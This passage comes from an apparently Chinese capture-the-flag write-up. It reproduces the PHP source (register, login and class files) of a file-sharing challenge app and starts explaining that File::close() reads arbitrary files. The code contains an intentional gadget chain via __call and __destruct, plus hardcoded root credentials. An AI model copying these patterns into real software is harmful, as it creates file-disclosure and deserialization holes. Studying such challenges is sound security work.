class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;register.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: index.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class=\"line\">  &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class=\"line\">  &lt;title&gt;注册&lt;&#x2F;title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;style&gt;</span><br><span class=\"line\">    .bd-placeholder-img &#123;</span><br><span class=\"line\">      font-size: 1.125rem;</span><br><span class=\"line\">      text-anchor: middle;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @media (min-width: 768px) &#123;</span><br><span class=\"line\">      .bd-placeholder-img-lg &#123;</span><br><span class=\"line\">        font-size: 3.5rem;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &lt;&#x2F;style&gt;</span><br><span class=\"line\">  &lt;!-- Custom styles for this template --&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;std.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class=\"line\">  &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;register.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class=\"line\">    &lt;h1 class&#x3D;&quot;h3 mb-3 font-weight-normal&quot;&gt;注册&lt;&#x2F;h1&gt;</span><br><span class=\"line\">    &lt;label for&#x3D;&quot;username&quot; class&#x3D;&quot;sr-only&quot;&gt;Username&lt;&#x2F;label&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;</span><br><span class=\"line\">    &lt;label for&#x3D;&quot;password&quot; class&#x3D;&quot;sr-only&quot;&gt;Password&lt;&#x2F;label&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class=\"line\">    &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class=\"line\">    &lt;p class&#x3D;&quot;mt-5 mb-3 text-muted&quot;&gt;&amp;copy; 2018-2019&lt;&#x2F;p&gt;</span><br><span class=\"line\">  &lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class=\"line\">    $u &#x3D; new User();</span><br><span class=\"line\">    $username &#x3D; (string) $_POST[&quot;username&quot;];</span><br><span class=\"line\">    $password &#x3D; (string) $_POST[&quot;password&quot;];</span><br><span class=\"line\">    if (strlen($username) &lt; 20 &amp;&amp; strlen($username) &gt; 2 &amp;&amp; strlen($password) &gt; 1) &#123;</span><br><span class=\"line\">        if ($u-&gt;add_user($username, $password)) &#123;</span><br><span class=\"line\">            echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;login.php?register&#39;;&lt;&#x2F;script&gt;&quot;);</span><br><span class=\"line\">            die();</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            echo &quot;&lt;script&gt;toast(&#39;此用户名已被使用&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class=\"line\">            die();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    echo &quot;&lt;script&gt;toast(&#39;请输入有效用户名和密码&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;class.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">$dbaddr &#x3D; &quot;127.0.0.1&quot;;</span><br><span class=\"line\">$dbuser &#x3D; &quot;root&quot;;</span><br><span class=\"line\">$dbpass &#x3D; &quot;root&quot;;</span><br><span class=\"line\">$dbname &#x3D; &quot;dropbox&quot;;</span><br><span class=\"line\">$db &#x3D; new mysqli($dbaddr, $dbuser, $dbpass, $dbname);</span><br><span class=\"line\"></span><br><span class=\"line\">class User &#123;</span><br><span class=\"line\">    public $db;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct() &#123;</span><br><span class=\"line\">        global $db;</span><br><span class=\"line\">        $this-&gt;db &#x3D; $db;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function user_exist($username) &#123;</span><br><span class=\"line\">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;username&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ? LIMIT 1;&quot;);</span><br><span class=\"line\">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        $stmt-&gt;store_result();</span><br><span class=\"line\">        $count &#x3D; $stmt-&gt;num_rows;</span><br><span class=\"line\">        if ($count &#x3D;&#x3D;&#x3D; 0) &#123;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function add_user($username, $password) &#123;</span><br><span class=\"line\">        if ($this-&gt;user_exist($username)) &#123;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class=\"line\">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;INSERT INTO &#96;users&#96; (&#96;id&#96;, &#96;username&#96;, &#96;password&#96;) VALUES (NULL, ?, ?);&quot;);</span><br><span class=\"line\">        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function verify_user($username, $password) &#123;</span><br><span class=\"line\">        if (!$this-&gt;user_exist($username)) &#123;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $password &#x3D; sha1($password . &quot;SiAchGHmFx&quot;);</span><br><span class=\"line\">        $stmt &#x3D; $this-&gt;db-&gt;prepare(&quot;SELECT &#96;password&#96; FROM &#96;users&#96; WHERE &#96;username&#96; &#x3D; ?;&quot;);</span><br><span class=\"line\">        $stmt-&gt;bind_param(&quot;s&quot;, $username);</span><br><span class=\"line\">        $stmt-&gt;execute();</span><br><span class=\"line\">        $stmt-&gt;bind_result($expect);</span><br><span class=\"line\">        $stmt-&gt;fetch();</span><br><span class=\"line\">        if (isset($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) &#123;</span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return false;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() &#123;</span><br><span class=\"line\">        $this-&gt;db-&gt;close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class FileList &#123;</span><br><span class=\"line\">    private $files;</span><br><span class=\"line\">    private $results;</span><br><span class=\"line\">    private $funcs;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __construct($path) &#123;</span><br><span class=\"line\">        $this-&gt;files &#x3D; array();</span><br><span class=\"line\">        $this-&gt;results &#x3D; array();</span><br><span class=\"line\">        $this-&gt;funcs &#x3D; array();</span><br><span class=\"line\">        $filenames &#x3D; scandir($path);</span><br><span class=\"line\"></span><br><span class=\"line\">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class=\"line\">        unset($filenames[$key]);   &#x2F;&#x2F;销毁变量</span><br><span class=\"line\">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class=\"line\">        unset($filenames[$key]);</span><br><span class=\"line\"></span><br><span class=\"line\">        foreach ($filenames as $filename) &#123;</span><br><span class=\"line\">            $file &#x3D; new File();</span><br><span class=\"line\">            $file-&gt;open($path . $filename);</span><br><span class=\"line\">            array_push($this-&gt;files, $file);</span><br><span class=\"line\">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __call($func, $args) &#123;  &#x2F;&#x2F;调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的</span><br><span class=\"line\">        array_push($this-&gt;funcs, $func);   </span><br><span class=\"line\">        foreach ($this-&gt;files as $file) &#123;</span><br><span class=\"line\">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function __destruct() &#123;</span><br><span class=\"line\">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class=\"line\">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class=\"line\">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class=\"line\">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class=\"line\">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class=\"line\">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class=\"line\">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class=\"line\">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class=\"line\">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;    &#x2F;&#x2F;将$value转换为 HTML 实体</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class=\"line\">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        echo $table;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class File &#123;</span><br><span class=\"line\">    public $filename;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function open($filename) &#123;</span><br><span class=\"line\">        $this-&gt;filename &#x3D; $filename;</span><br><span class=\"line\">        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;</span><br><span class=\"line\">            return true;</span><br><span class=\"line\">        &#125; else &#123;</span><br><span class=\"line\">            return false;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function name() &#123;</span><br><span class=\"line\">        return basename($this-&gt;filename);  &#x2F;&#x2F;返回路径中的文件名部分</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function size() &#123;</span><br><span class=\"line\">        $size &#x3D; filesize($this-&gt;filename);</span><br><span class=\"line\">        $units &#x3D; array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);</span><br><span class=\"line\">        for ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</span><br><span class=\"line\">        return round($size, 2).$units[$i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function detele() &#123;</span><br><span class=\"line\">        unlink($this-&gt;filename);  &#x2F;&#x2F;删除文件</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public function close() &#123;</span><br><span class=\"line\">        return file_get_contents($this-&gt;filename);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;login.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">if (isset($_SESSION[&#39;login&#39;])) &#123;</span><br><span class=\"line\">    header(&quot;Location: index.php&quot;);</span><br><span class=\"line\">    die();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;!doctype html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class=\"line\">  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1, shrink-to-fit&#x3D;no&quot;&gt;</span><br><span class=\"line\">  &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&quot;&gt;</span><br><span class=\"line\">  &lt;title&gt;登录&lt;&#x2F;title&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;!-- Bootstrap core CSS --&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">  &lt;style&gt;</span><br><span class=\"line\">    .bd-placeholder-img &#123;</span><br><span class=\"line\">      font-size: 1.125rem;</span><br><span class=\"line\">      text-anchor: middle;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    @media (min-width: 768px) &#123;</span><br><span class=\"line\">      .bd-placeholder-img-lg &#123;</span><br><span class=\"line\">        font-size: 3.5rem;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &lt;&#x2F;style&gt;</span><br><span class=\"line\">  &lt;!-- Custom styles for this template --&gt;</span><br><span class=\"line\">  &lt;link href&#x3D;&quot;static&#x2F;css&#x2F;std.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body class&#x3D;&quot;text-center&quot;&gt;</span><br><span class=\"line\">  &lt;form class&#x3D;&quot;form-signin&quot; action&#x3D;&quot;login.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class=\"line\">    &lt;h1 class&#x3D;&quot;h3 mb-3 font-weight-normal&quot;&gt;登录&lt;&#x2F;h1&gt;</span><br><span class=\"line\">    &lt;label for&#x3D;&quot;username&quot; class&#x3D;&quot;sr-only&quot;&gt;Username&lt;&#x2F;label&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Username&quot; required autofocus&gt;</span><br><span class=\"line\">    &lt;label for&#x3D;&quot;password&quot; class&#x3D;&quot;sr-only&quot;&gt;Password&lt;&#x2F;label&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot; class&#x3D;&quot;form-control&quot; placeholder&#x3D;&quot;Password&quot; required&gt;</span><br><span class=\"line\">    &lt;button class&#x3D;&quot;btn btn-lg btn-primary btn-block&quot; type&#x3D;&quot;submit&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class=\"line\">    &lt;p class&#x3D;&quot;mt-5 text-muted&quot;&gt;还没有账号? &lt;a href&#x3D;&quot;register.php&quot;&gt;注册&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class=\"line\">    &lt;p class&#x3D;&quot;text-muted&quot;&gt;&amp;copy; 2018-2019&lt;&#x2F;p&gt;</span><br><span class=\"line\">  &lt;&#x2F;form&gt;</span><br><span class=\"line\">  &lt;div class&#x3D;&quot;top&quot; id&#x3D;&quot;toast-container&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;bootstrap.bundle.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;script src&#x3D;&quot;static&#x2F;js&#x2F;toast.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">include &quot;class.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#39;register&#39;])) &#123;</span><br><span class=\"line\">    echo &quot;&lt;script&gt;toast(&#39;注册成功&#39;, &#39;info&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_POST[&quot;username&quot;]) &amp;&amp; isset($_POST[&quot;password&quot;])) &#123;</span><br><span class=\"line\">    $u &#x3D; new User();</span><br><span class=\"line\">    $username &#x3D; (string) $_POST[&quot;username&quot;];</span><br><span class=\"line\">    $password &#x3D; (string) $_POST[&quot;password&quot;];</span><br><span class=\"line\">    if (strlen($username) &lt; 20 &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;</span><br><span class=\"line\">        $_SESSION[&#39;login&#39;] &#x3D; true;</span><br><span class=\"line\">        $_SESSION[&#39;username&#39;] &#x3D; htmlentities($username);</span><br><span class=\"line\">        $sandbox &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SESSION[&#39;username&#39;] . &quot;sftUahRiTz&quot;) . &quot;&#x2F;&quot;;</span><br><span class=\"line\">        if (!is_dir($sandbox)) &#123;</span><br><span class=\"line\">            mkdir($sandbox);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $_SESSION[&#39;sandbox&#39;] &#x3D; $sandbox;</span><br><span class=\"line\">        echo(&quot;&lt;script&gt;window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);</span><br><span class=\"line\">        die();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    echo &quot;&lt;script&gt;toast(&#39;账号或密码错误&#39;, &#39;warning&#39;);&lt;&#x2F;script&gt;&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>在class.php中，File::close()可以读取到文件内容</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">File</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> $filename;</span><br><span class=\"line\"></span><br><span class=\"line\">    ...</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">close</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> file_get_contents(<span class=\"keyword\">$this</span>-&gt;filename);</span><br><span class=\"line\">    &#125;</span><br><span 